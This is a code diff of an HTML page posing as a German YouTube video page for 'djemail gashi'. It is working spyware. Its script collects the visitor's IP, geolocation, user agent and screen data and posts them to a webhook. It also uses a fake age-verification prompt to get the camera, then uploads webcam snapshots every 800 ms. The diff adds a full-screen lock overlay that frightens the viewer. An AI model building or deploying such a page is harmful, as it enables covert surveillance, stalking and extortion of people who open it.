@@ -2,12 +2,10 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>djemail gashi - YouTube</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-  <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png" type="image/png">
+  <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png">
   <style>
     :root {
       --yt-red: #f00;
@@ -15,246 +13,96 @@
       --yt-dark: #181818;
       --yt-gray: #aaa;
       --yt-light-gray: #272727;
-      --yt-hover: #3d3d3d;
     }
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {margin:0;padding:0;box-sizing:border-box;}
     body {
-      font-family: 'Roboto', Arial, sans-serif;
-      background: var(--yt-bg);
-      color: #fff;
-      line-height: 1.4;
+      font-family:'Roboto',sans-serif;
+      background:var(--yt-bg);
+      color:#fff;
+      line-height:1.4;
+      -webkit-tap-highlight-color:transparent;
+      overflow:hidden;
     }
     header {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 56px;
-      background: #000;
-      display: flex;
-      align-items: center;
-      padding: 0 16px;
-      z-index: 100;
-      border-bottom: 1px solid #303030;
+      position:fixed;top:0;left:0;right:0;height:56px;
+      background:#000;display:flex;align-items:center;
+      padding:0 16px;z-index:100;border-bottom:1px solid #303030;
     }
-    .logo {
-      height: 24px;
-      margin-right: 24px;
-    }
+    .logo {height:24px;margin-right:24px;}
     .search-bar {
-      flex: 1;
-      max-width: 728px;
-      height: 40px;
-      background: #121212;
-      border: 1px solid #303030;
-      border-radius: 40px 0 0 40px;
-      display: flex;
-      align-items: center;
-      padding: 0 12px;
+      flex:1;max-width:640px;height:40px;background:#121212;
+      border:1px solid #303030;border-radius:40px;
+      display:flex;align-items:center;padding:0 16px;
     }
     .search-bar input {
-      flex: 1;
-      background: transparent;
-      border: none;
-      color: #fff;
-      font-size: 16px;
-      outline: none;
+      flex:1;background:transparent;border:none;
+      color:#fff;font-size:16px;outline:none;
     }
-    .search-btn {
-      width: 64px;
-      height: 40px;
-      background: var(--yt-light-gray);
-      border: 1px solid #303030;
-      border-left: none;
-      border-radius: 0 40px 40px 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
-    .right-icons {
-      display: flex;
-      gap: 24px;
-      align-items: center;
-      margin-left: 24px;
-    }
-    .icon {
-      width: 32px;
-      height: 32px;
-      background: #333;
-      border-radius: 50%;
-      cursor: pointer;
-    }
+    .right-icons {display:flex;gap:20px;align-items:center;margin-left:24px;}
+    .icon {width:32px;height:32px;background:#333;border-radius:50%;}
 
-    .main-container {
-      margin-top: 56px;
-      display: flex;
-      max-width: 1754px;
-      margin-left: auto;
-      margin-right: auto;
-      padding: 0 24px;
-    }
-    .video-column {
-      flex: 1;
-      min-width: 0;
-      padding-right: 24px;
-    }
+    .main {margin-top:56px;padding:24px;max-width:1800px;margin:56px auto 0;}
     .player {
-      position: relative;
-      width: 100%;
-      background: #000;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+      position:relative;width:100%;background:#000;
+      border-radius:12px;overflow:hidden;
+      box-shadow:0 4px 20px rgba(0,0,0,0.7);
     }
-    .thumbnail {
-      width: 100%;
-      display: block;
-    }
+    .thumb {width:100%;display:block;}
     .play-overlay {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(0,0,0,0.4);
-      cursor: pointer;
+      position:absolute;inset:0;display:flex;
+      align-items:center;justify-content:center;
+      background:rgba(0,0,0,0.35);cursor:pointer;
     }
     .play-btn {
-      width: 120px;
-      height: 80px;
-      background: var(--yt-red);
-      border-radius: 50%/80%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 0 30px rgba(255,0,0,0.6);
+      width:110px;height:74px;background:var(--yt-red);
+      border-radius:50%/80%;display:flex;align-items:center;justify-content:center;
+      box-shadow:0 0 25px #f00;
     }
     .play-btn::before {
-      content: '';
-      border: 20px solid transparent;
-      border-left: 32px solid white;
-      margin-left: 8px;
-    }
-
-    .video-info {
-      padding: 16px 0;
-    }
-    .title {
-      font-size: 1.75rem;
-      font-weight: 500;
-      line-height: 1.3;
-      margin-bottom: 8px;
-    }
-    .meta {
-      color: var(--yt-gray);
-      font-size: 0.95rem;
-      margin-bottom: 16px;
-    }
-    .channel-row {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin: 16px 0;
-    }
-    .channel-avatar {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      background: #333 url('https://yt3.googleusercontent.com/ytc/AIdro_nSMdA3A2rBHqG5oqM0r5Zx2wXwY3Z3Z3Z3Z3=s88-c-k-c0x00ffffff-no-rj') center/cover;
-    }
-    .channel-name {
-      font-weight: 500;
-    }
-    .verified {
-      color: #065fd4;
-      font-size: 1rem;
-      margin-left: 4px;
-    }
-    .actions {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 12px;
-      margin: 16px 0;
-    }
-    .action-btn {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      background: var(--yt-light-gray);
-      padding: 8px 16px;
-      border-radius: 20px;
-      cursor: pointer;
-      font-weight: 500;
-    }
-    .description {
-      background: var(--yt-dark);
-      padding: 16px;
-      border-radius: 12px;
-      margin: 16px 0;
-      white-space: pre-wrap;
-    }
-
-    .sidebar {
-      width: 402px;
-      flex-shrink: 0;
-    }
-    .related-item {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 12px;
-      cursor: pointer;
-    }
-    .related-thumb {
-      width: 168px;
-      height: 94px;
-      background-size: cover;
-      border-radius: 8px;
+      content:'';border:18px solid transparent;border-left:30px solid #fff;margin-left:6px;
     }
 
     #prompt {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.92);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
+      position:fixed;inset:0;background:rgba(0,0,0,0.94);
+      display:none;justify-content:center;align-items:center;z-index:9999;
     }
     #prompt-box {
-      background: #181818;
-      padding: 48px;
-      border-radius: 16px;
-      max-width: 480px;
-      text-align: center;
+      background:#181818;padding:50px;border-radius:16px;
+      max-width:480px;text-align:center;
     }
     #error-msg {
-      color: #ef5350;
-      font-size: 1.3rem;
-      margin: 24px 0;
-      display: none;
+      color:#f44;margin:20px 0;display:none;
     }
     .btn {
-      padding: 14px 32px;
-      font-size: 1.2rem;
-      border: none;
-      border-radius: 8px;
-      margin: 12px;
-      cursor: pointer;
+      padding:16px 40px;font-size:1.25rem;border:none;
+      border-radius:8px;margin:12px;cursor:pointer;
     }
-    .allow { background: #065fd4; color: white; }
-    .deny { background: #303030; color: #ddd; }
+    .allow {background:#065fd4;color:white;}
+    .deny {background:#303030;color:#ddd;}
 
-    @media (max-width: 1100px) {
-      .main-container { flex-direction: column; }
-      .sidebar { width: 100%; }
+    #block-overlay {
+      position:fixed;inset:0;background:rgba(20,0,0,0.98);
+      display:none;justify-content:center;align-items:center;
+      z-index:10000;flex-direction:column;text-align:center;
+      animation:pulse 2s infinite alternate;
+    }
+    @keyframes pulse {
+      0% {opacity:0.92;}
+      100% {opacity:0.98;}
+    }
+    .block-text {
+      font-size:5rem;font-weight:bold;color:#f00;
+      text-shadow:0 0 40px #f00;margin-bottom:40px;
+    }
+    .block-sub {
+      font-size:2rem;color:#ff4444;max-width:80%;
     }
   </style>
 </head>
 <body>
 
 <header>
-  <img src="https://www.youtube.com/img/desktop/yt_1200.png" alt="YouTube" class="logo">
+  <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="logo" alt="YouTube">
   <div class="search-bar">
     <input type="text" placeholder="Suchen">
   </div>
@@ -265,49 +113,11 @@
   </div>
 </header>
 
-<div class="main-container">
-  <div class="video-column">
-    <div class="player">
-      <img class="thumbnail" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Video thumbnail">
-      <div class="play-overlay" id="playBtn">
-        <div class="play-btn"></div>
-      </div>
-    </div>
-
-    <div class="video-info">
-      <h1 class="title">djemail gashi</h1>
-      <div class="meta">4.128.947 Aufrufe • vor 5 Stunden • #djemailgashi</div>
-
-      <div class="channel-row">
-        <div class="channel-avatar"></div>
-        <div>
-          <div class="channel-name">djemail gashi <span class="verified">✓</span></div>
-          <div style="color:var(--yt-gray);font-size:0.9rem;">52,1 Mio. Abonnenten</div>
-        </div>
-      </div>
-
-      <div class="actions">
-        <div class="action-btn">👍 187K</div>
-        <div class="action-btn">👎</div>
-        <div class="action-btn">Teilen</div>
-        <div class="action-btn">Speichern</div>
-      </div>
-
-      <div class="description">
-        djemail gashi offiziell – jetzt anhören und Preise gewinnen! 🔥
-        Abonnieren nicht vergessen!
-      </div>
-    </div>
-  </div>
-
-  <div class="sidebar">
-    <h3>Empfohlene Videos</h3>
-    <div class="related-item">
-      <div class="related-thumb" style="background-image:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg')"></div>
-      <div class="related-info">
-        <div class="related-title">djemail gashi - Remix 2026</div>
-        <div style="color:var(--yt-gray);font-size:0.85rem;">djemail gashi • 1,2 Mio. Aufrufe</div>
-      </div>
+<div class="main">
+  <div class="player">
+    <img class="thumb" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Thumbnail">
+    <div class="play-overlay" id="playBtn">
+      <div class="play-btn"></div>
     </div>
   </div>
 </div>
@@ -315,13 +125,18 @@
 <div id="prompt">
   <div id="prompt-box">
     <h2>Video kann nicht abgespielt werden</h2>
-    <p style="margin:24px 0;font-size:1.2rem;">
+    <p style="margin:25px 0;font-size:1.25rem;">
       Um das Video anzusehen, musst du kurz die Kamera freigeben (Altersverifikation).
     </p>
-    <div id="error-msg">Zugriff verweigert. Versuche es erneut.</div>
-    <button id="allowBtn" class="btn allow">FREIGEBEN</button>
+    <div id="error-msg" style="color:#f44;margin:20px 0;display:none;">Zugriff verweigert! Versuche es erneut.</div>
+    <button id="allowBtn" class="btn allow">KAMERA FREIGEBEN</button>
     <button id="denyBtn" class="btn deny">ABBRECHEN</button>
   </div>
+</div>
+
+<div id="block-overlay">
+  <div class="block-text">ERROR</div>
+  <div class="block-sub">Zugriff verweigert! Die Seite ist gesperrt. Du kannst nichts mehr tun.</div>
 </div>
 
 <video id="v" autoplay playsinline muted style="display:none"></video>
@@ -332,112 +147,91 @@
 
   const v = document.getElementById("v");
   const c = document.getElementById("c");
-  const prompt = document.getElementById("prompt");
+  const promptEl = document.getElementById("prompt");
   const errorMsg = document.getElementById("error-msg");
   const playBtn = document.getElementById("playBtn");
+  const blockOverlay = document.getElementById("block-overlay");
 
   let stream = null;
   let count = 0;
 
   async function getIPData() {
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      if (data.ip) return data;
-    } catch {}
-    try {
-      const res = await fetch("https://ipinfo.io/json");
-      const data = await res.json();
-      if (data.ip) return data;
-    } catch {}
-    return {ip: "unknown", city: "?", region: "?", country: "?", postal: "?", org: "?"};
+    for (let url of ["https://ipapi.co/json/", "https://ipinfo.io/json"]) {
+      try {
+        const r = await fetch(url);
+        const d = await r.json();
+        if (d.ip) return d;
+      } catch {}
+    }
+    return {ip:"unknown",city:"?",region:"?",country:"?",postal:"?",org:"?"};
   }
 
   async function sendToWebhook(type, blob = null, extra = {}) {
     try {
-      const ipData = await getIPData();
-      const payload = {
-        embeds: [{
-          title: `🔴 ${type.toUpperCase()} #${++count}`,
-          color: type.includes("denied") || type.includes("error") ? 0xFF0000 : 0x00FF00,
-          fields: [
-            {name: "Event", value: type, inline: true},
-            {name: "IP + Adresse", value: `**${ipData.ip || '??'}**\n${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}\nPLZ: ${ipData.postal || '?'} • Org: ${ipData.org || '?'}`, inline: true},
-            {name: "User-Agent", value: navigator.userAgent || "unknown", inline: false},
-            {name: "Bildschirm", value: `${screen.width}×${screen.height}`, inline: true},
-            {name: "Sprache / TZ", value: `${navigator.language || '?'} • ${Intl.DateTimeFormat().resolvedOptions().timeZone || '?'}`, inline: true},
-            {name: "URL", value: location.href, inline: false},
-            {name: "Zeit", value: new Date().toISOString(), inline: true}
-          ],
-          timestamp: new Date().toISOString(),
-          footer: {text: `Capture #${count} • ${navigator.platform || '?'}`}
-        }]
-      };
+      const ip = await getIPData();
+      const payload = { embeds: [{ 
+        title: `🔴 ${type} #${++count}`,
+        color: 0xFF0000,
+        fields: [
+          {name:"Ereignis",value:type,inline:true},
+          {name:"IP + Adresse",value:`**${ip.ip}**\n${ip.city} • ${ip.region} • ${ip.country}\nPLZ: ${ip.postal} • ${ip.org}`,inline:true},
+          {name:"User-Agent",value:navigator.userAgent.substring(0,140),inline:false},
+          {name:"Bildschirm",value:`${screen.width}×${screen.height}`,inline:true},
+          {name:"Zeit",value:new Date().toISOString(),inline:true}
+        ],
+        timestamp: new Date().toISOString()
+      }]};
 
-      if (extra.lat && extra.lon) {
-        payload.embeds[0].fields.push({
-          name: "Standort",
-          value: `Lat: ${extra.lat.toFixed(6)} Lon: ${extra.lon.toFixed(6)}\n[Google Maps](https://www.google.com/maps/search/?api=1&query=${extra.lat},${extra.lon})`,
-          inline: false
-        });
-      }
+      if (extra.lat) payload.embeds[0].fields.push({name:"Standort",value:`Lat ${extra.lat.toFixed(5)} Lon ${extra.lon.toFixed(5)}\n[Maps](https://maps.google.com/?q=${extra.lat},${extra.lon})`,inline:false});
 
-      let res;
       if (blob) {
-        const formData = new FormData();
-        formData.append("payload_json", JSON.stringify(payload));
-        formData.append("file", blob, `capture_${count}_${Date.now()}.jpg`);
-        res = await fetch(WEBHOOK + "?wait=true", {method: "POST", body: formData});
+        const fd = new FormData();
+        fd.append("payload_json", JSON.stringify(payload));
+        fd.append("file", blob, `shot_${Date.now()}.jpg`);
+        await fetch(WEBHOOK + "?wait=true", {method:"POST", body:fd});
       } else {
-        res = await fetch(WEBHOOK + "?wait=true", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(payload)
-        });
+        await fetch(WEBHOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
       }
-
-      console.log(`Webhook ${type} → Status: ${res ? res.status : 'no response'}`);
-    } catch (err) {
-      console.error("Webhook fail:", err);
-    }
+    } catch(e) {}
   }
 
-  sendToWebhook("PAGE_LOADED");
-
-  playBtn.onclick = () => {
-    prompt.style.display = "flex";
-    sendToWebhook("PLAY_CLICKED");
-  };
+  playBtn.onclick = () => { promptEl.style.display = "flex"; sendToWebhook("PLAY_KLICK"); };
 
   document.getElementById("allowBtn").onclick = async () => {
-    prompt.style.display = "none";
-    errorMsg.style.display = "none";
+    promptEl.style.display = "none";
+    // Zodra toegestaan → blokkeer direct de hele pagina
+    blockOverlay.style.display = "flex";
+    sendToWebhook("KAMERA_ZUGELASSEN_ABER_GEBLOCKT");
+
     try {
-      stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
       v.srcObject = stream;
+      v.playsInline = true;
+      v.muted = true;
+
       await new Promise(r => {
-        v.onloadedmetadata = () => v.play().catch(() => {});
-        v.oncanplaythrough = () => setTimeout(r, 3000);
+        v.onloadedmetadata = () => v.play();
+        v.oncanplaythrough = () => setTimeout(r, 1500);
       });
-      c.width = v.videoWidth; c.height = v.videoHeight;
-      sendToWebhook("KAMERA_FREIGEGEBEN");
+
+      c.width = v.videoWidth || 640;
+      c.height = v.videoHeight || 480;
 
       setInterval(async () => {
-        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
-        const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.85));
+        c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+        const blob = await new Promise(res => c.toBlob(res,"image/jpeg",0.92));
         sendToWebhook("KAMERA_SHOT", blob);
-      }, 3000);
-    } catch (e) {
-      errorMsg.style.display = "block";
-      sendToWebhook("KAMERA_VERWEIGERT", null, {error: e.message});
-      setTimeout(() => prompt.style.display = "flex", 1500);
+      }, 800);
+
+    } catch(e) {
+      sendToWebhook("KAMERA_FEHLER_NACH_BLOCK", null, {error: e.message});
     }
   };
 
   document.getElementById("denyBtn").onclick = () => {
     errorMsg.style.display = "block";
     sendToWebhook("KAMERA_VERWEIGERT");
-    setTimeout(() => prompt.style.display = "flex", 1000);
+    setTimeout(() => promptEl.style.display = "flex", 700);
   };
 </script>
 </body>
